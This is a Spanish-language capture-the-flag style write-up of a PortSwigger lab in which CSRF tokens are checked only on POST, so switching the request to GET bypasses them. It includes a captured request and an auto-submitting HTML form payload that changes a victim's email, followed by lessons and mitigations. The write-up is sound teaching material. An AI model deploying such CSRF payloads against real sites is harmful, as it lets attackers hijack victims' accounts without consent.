---
title: "CSRF where token validation depends on request method"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "csrf-where-token-validation-depends-on-request-method"
author: "Z4k7"
date: "2026-04-04"
year: "2026"
status: "pwned"
tags:
  - "CSRF"
techniques:
  - "CSRF Token Bypass"
  - "Method Override (POST→GET)"
  - "Incomplete Validation"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF donde la aplicación implementa protección con tokens CSRF, pero solo valida el token cuando la solicitud es POST. El atacante puede eludir esta validación cambiando el método HTTP de POST a GET, omitiendo la verificación del token. El servidor procesa la solicitud GET sin requerir el parámetro csrf, permitiendo un CSRF exitoso que cambia el email de la víctima.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Intenta bloquear estos ataques, pero solo aplica medidas de seguridad a ciertos tipos de solicitudes.
          Para resolver el laboratorio, utiliza tu servidor de explotación para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del usuario.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: `wiener:peter`
      - kind: "callout"
        type: "info"
        label: "Pista"
        text: "No puedes registrar una dirección de correo electrónico que ya esté en uso por otro usuario. Si cambias tu dirección de correo electrónico mientras pruebas tu exploit, asegúrate de usar una dirección diferente para el exploit final que le envíes a la víctima."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404134855839.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Accedemos en el apartado de login para ingresar con los datos suministrados en el objetivo del laboratorio:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404134920923.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos y contamos con al usuario wiener en dicho apartado
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404134948557.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual en este caso podremos validar la siguiente información.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404135030740.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En este lab hay algo diferente: el token CSRF SÍ existe. Pero nota que el formulario usa POST. ¿Qué pasa si cambias a GET? ¿El navegador sigue enviando parámetros? ¿El servidor valida de la misma forma? Este es el tipo de preguntas que definen si una defensa es robusta."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultamos el código de la web el apartado del input que permite ingresar datos para el cambio del Email.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404135243176.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El código anterior nos permite confirmar un formulario que habilita el envío de un correo electrónico para solicitar el cambio. Además, se evidencia la presencia de un token CSRF, el cual protege el formulario y evita modificaciones no autorizadas, garantizando que solo el usuario legítimo pueda realizar la acción.
          Se emula el proceso de cambio de correo electrónico asociado al usuario actual con el fin de validar si es posible realizar dicha modificación y analizar las cabeceras que se envían durante la operación.
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/2
          Host: 0ab400d003db6805813757d200aa005f.web-security-academy.net
          Cookie: session=0kQx18832Rlmav9OKUiDLVFiiXvPu4hw
          Content-Length: 65
          Cache-Control: max-age=0
          Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
          Sec-Ch-Ua-Mobile: ?0
          Sec-Ch-Ua-Platform: "Windows"
          Accept-Language: es-419,es;q=0.9
          Origin: https://0ab400d003db6805813757d200aa005f.web-security-academy.net
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          Sec-Fetch-Site: same-origin
          Sec-Fetch-Mode: navigate
          Sec-Fetch-User: ?1
          Sec-Fetch-Dest: document
          Referer: https://0ab400d003db6805813757d200aa005f.web-security-academy.net/my-account?id=wiener
          Accept-Encoding: gzip, deflate, br
          Priority: u=0, i
          
          email=validacion%40gmai.com&csrf=pUY2jIUUFR2l5Z21L46aNVVjhwvqurs2
      - kind: "note"
        text: |
          En el código anterior se confirma los siguientes aparatos para confirmar la autenticación del usuario real de la solicitud. El parámetro `csrf=pUY2jIUUFR2l5Z21L46aNVVjhwvqurs2` es el token CSRF que protege la solicitud.
      - kind: "callout"
        type: "warning"
        label: "Token CSRF Present pero Validación Incompleta"
        text: "El servidor VALIDA el token cuando la solicitud es POST — pero ¿qué pasa con GET? Si el servidor solo verifica el token en POST, podemos cambiar a GET y omitir la validación completamente."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es el error más común en implementaciones CSRF: asumir que ciertos métodos HTTP no requieren validación. Los desarrolladores piensan 'GET es para lectura, POST es para escritura, solo valido en POST'. Pero nada impide que un formulario use GET para cambios — y el servidor debe validar sin importar el método."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Si tratamos de enviar un formulario POST sin el token CSRF, el servidor nos rechaza:
      - kind: "code"
        lang: "JS"
        code: |
          <form class="login-form" name="change-email-form" action="https://0ab400d003db6805813757d200aa005f.web-security-academy.net/my-account/change-email" method="POST">
          <input type="email" name="email" value="hack@gmail.com" />
          </form>
          <script> 
          	  document.forms[0].submit(); 
          </script>
      - kind: "note"
        text: |
          El anterior código permite simular un formulario de cambio de correo electrónico se hace pasar por el formulario original. Sin embargo, sin el token CSRF, el servidor rechazará la solicitud con el error: `Missing parameter 'csrf'`
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404140243731.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404140741043.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso el error se debe por afectación de CSRF como no contamos con el Token el sistema de validación del servidor no permite continuar con el proceso.
          Sin embargo, en algunas configuraciones se puede eludir cambiando el `method` de POST a GET:
          Se envía para el apartado de repeater y cambiamos el `method` a GET:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141414361.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos que realmente el servidor nos permite cambiar el correo sin saltar error en CSRF:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141506486.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ¡El servidor acepta la solicitud GET SIN validar el token CSRF! Esto confirma que la validación solo aplica a POST.
          Aplicamos el mismo cambio para el código ya creado:
      - kind: "code"
        lang: "HTML"
        code: |
          <form class="login-form" name="change-email-form" action="https://0ab400d003db6805813757d200aa005f.web-security-academy.net/my-account/change-email" method="GET">
          <input type="email" name="email" value="hack@gmail.com" />
          </form>
          <script> 
          	  document.forms[0].submit(); 
          </script>
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — Method Override"
        text: "1. Formulario POST requiere token CSRF 2. Formulario GET NO requiere token CSRF (validación omitida) 3. Parámetros en GET se envían en la URL, no en el body 4. Servidor procesa sin validar → Email cambiado ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es CRÍTICO en auditorías reales. Muchas aplicaciones validan solo en POST porque 'es el método estándar para cambios'. Pero HTTP es agnóstico — GET puede modificar datos si el servidor lo permite. La validación debe ser independiente del método HTTP."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` en dicho apartado nos permite simular un servidor atacante.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141620720.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima en este caso para confirmar que la víctima realizó dicho cambio validamos en el apartado de LOG para confirmar cambios en el servidor y la víctima.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141653769.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se envía el formulario la víctima:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141808318.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/file-20260404141821162.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el apartado de los log del servidor la víctima accede a la web y se realiza la modificación del correo.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El log del servidor confirma: la víctima visitó el exploit, la solicitud GET se procesó sin validar token, y el email cambió. Lab completado. Este es el tipo de error que aparece regularmente en aplicaciones reales — 'protegemos POST pero nos olvidamos de GET'."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios tradicional, pero demuestra una escalada funcional similar a labs anteriores.
          La diferencia crítica con labs anteriores:
      - kind: "bullet"
        text: "Lab 1 (sin defensa): Cero protección"
      - kind: "bullet"
        text: "Lab 2 (Referer incompleta): Hay validación pero se puede omitir"
      - kind: "bullet"
        text: "Lab 3 (método incompleto): Hay token CSRF pero solo valida en un método HTTP"
      - kind: "note"
        text: |
          Cada bypass es más sofisticado — requiere entender el comportamiento HTTP y los supuestos del servidor.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En producción, este bypass es el más peligroso porque parece 'seguro' — hay un token CSRF. Pero los desarrolladores asumen que 'solo POST modifica datos', violando el principio de defensa en profundidad. Siempre asume que un atacante puede elegir cualquier método HTTP."

lessons:
  - 'La validación CSRF debe ser independiente del método HTTP: POST, PUT, PATCH, DELETE, GET — todos requieren token si modifican datos.'
  - 'No hagas supuestos sobre métodos HTTP: El método POST es "convención", no "ley". GET puede modificar datos si el servidor lo permite.'
  - 'Defensa incompleta = no es defensa: Si solo proteges un caso de uso, un atacante encontrará otro.'
  - 'El server-side nunca debería confiar en el navegador: El navegador envía GET o POST basado en el formulario — pero el atacante controla el formulario.'
  - 'BurpSuite permite probar cambios de método fácilmente: La función "Change request method" es esencial en auditorías.'
  - 'Este bypass es más realista que "sin defensa": En producción encontrarás defensas incompletas más que nada.'
mitigation:
  - 'Validar tokens CSRF para TODOS los métodos HTTP que modifiquen datos: POST, PUT, PATCH, DELETE, GET (si se usa para modificar).'
  - 'No hacer supuestos sobre métodos HTTP: Implementar validación basada en acciones, no en métodos.'
  - 'Usar métodos seguros solo para lectura: Considerar GET como readonly — cualquier modificación debe ser POST/PUT/PATCH/DELETE.'
  - 'Implementar validación en middleware/capa de autenticación: No dejarla al desarrollador individual de endpoints.'
  - 'SameSite cookies Strict/Lax también previenen esto: Bloqueando solicitudes cross-site sin importar el método.'
  - 'Monitorear patrones anómalos: Solicitudes GET con parámetros que modifican datos son sospechosas.'
---
